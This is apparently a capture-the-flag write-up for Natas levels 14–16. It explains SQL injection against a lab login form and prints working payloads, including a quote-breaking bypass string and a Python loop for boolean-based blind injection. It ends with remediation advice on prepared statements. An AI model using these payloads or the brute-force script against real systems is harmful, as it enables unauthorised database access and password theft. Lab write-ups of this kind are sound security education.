# SQL Injections

## Natas Level 14 → 15

### Technical Overview
* **Vulnerability Class:** SQL Injection
* **Impact:** Unauthorised Access to Database leading to Sensitive Information Disclosure.
* **Tools Used:** Browser.

### Summary
The webpage contains a login form that is left completely unprotected against SQL Injections. The application takes raw user input and directly inserts it into an SQL query without any sanitisation or validation. This allows us to inject our own SQL code into the query, bypassing authentication and retrieving sensitive information from the database.

### Vulnerable Code Snippet
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

### Exploitation Walkthrough
The PHP snippet above constructs the following SQL query:
```sql
SELECT * from users where username="[INPUT]" and password="[INPUT]"
```
If, for one of our inputs (easier to parse if we use the password field), we include a `"` character, we break out of the string context and can append our own SQL code. For example, inputting the following into the password field reveals the entire users table:
```sql
test" or "1=1
```
This makes the query:
```sql
SELECT * from users where username="test" and password="test" or "1=1"
```
Which yields the password.

## Natas Level 15 → 16

### Technical Overview
* **Vulnerability Class:** Boolean-based Blind SQL Injection
* **Impact:** Unauthorised Access to Database leading to Sensitive Information Disclosure.
* **Tools Used:** Python.

### Summary
This time, the page contains a single input field that returns whether a user exists in the database or not. It improves on the previous level by not returning any other data, however it is still vulnerable to SQL Injection. We can use a brute force each character of the password by using a boolean-based blind SQL injection, allowing us to determine the password one character at a time.

### Vulnerable Code Snippet
```php
if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";}
```

### Exploitation Walkthrough
#### Step 1: Understanding the Vulnerability
The input query, combined with the PHP snippet above, takes a username and returns whether the user exists in the database or not depending on the number of rows returned (no rows means the user does not exist). As we can inject whatever SQL code we want, we can check the number of rows that fulfil *any* condition of our choosing. For example, we can check the length of the password by injecting the following into the field: 
```sql
test" OR LENGTH(password) = "32
```
Which returns "This user exists."
#### Step 2: Deciding on a brute force strategy
Clearly, we can brute force the password, but we need to decide how. 
The initial assumption may be to just brute force the password, trying different combinations until we find the correct one. However, we quickly realise this wouldn't be feasible. looking at the passwords up to this point, we can see they are all 32 characters long, with each character being a lowercase letter, uppercase letter or number. This means there are $62^{32}$ possible combinations, and we don't want to take seventy-two tredecillion years for a single flag!
Alternatively, we can brute force the password one character at a time. This means we only need to check $62*32 = 1984$ combinations, which is much more feasible. We can do this by checking if the $n^{\text{th}}$ element of the password matches a given character with the following SQL code:
```sql
SELECT * from users where username="..." AND BINARY SUBSTRING(password, n, 1) = '[CHAR]'
```
We use BINARY to ensure that the comparison is case-sensitive.

#### Step 3: Automating with a Python Script
Now, we can use this to crack the password by guessing checking every possibility for each element of the password, moving on when we find the correct character. The full python script can be found [here](./16_script.py), however the core of the script is as follows:

```python
for i in range(1, password_length + 1):
    for guess in charset:
        payload = {
            "username": f'natas16" AND BINARY SUBSTRING(password, {i}, 1) = "{guess}'
        }
        response = session.post(url, data = payload)
        if 'This user exists.' in response.text:
            print(f'{guess} in position {i}')
            password = password + guess
            break
```
*We check specifically for the password on natas16, as there are multiple passwords in the database and otherwise you'll find a mix of characters from different passwords.*

#### Step 4: Potential Improvements
This script is perfectly adequate, returning the password in less than a minute. However, we could improve, for example with:
- **Parallelisation:** We could use multiple threads to check different characters at the same time, speeding up the process.
- **Binary Search:** Instead of checking each character in the charset one by one, we could use a binary search, massively reducing the number of requests needed to find each character. This would require a different approach to the SQL injection, but would be much faster.  
There are many other ways to improve the script, but these are a couple of the most obvious.


## Remediations
- **Reducing Information Disclosure:** When we query a database, we should never return more information than is necessary. Level 14 just returns the result of the query, which is how we are able to retrieve the password. Level 15 implements this remediation by only returning whether a user exists or not.
- **Input Validation and Sanitisation:** We should always validate and sanitise user input, ensuring that it is of the expected type and format. This can be done with regular expressions, or by using built-in functions like `filter_var()` in PHP. However, this should not be relied upon as the sole defence against SQL injection, as it can be bypassed. 
- **Prepared Statements:** Prepared statements are a way to parameterise SQL queries, allowing us to separate the query from the data. This means that the data is never directly inserted into the query, preventing SQL injection attacks. In PHP, we can use the `mysqli` or `PDO` libraries to create prepared statements.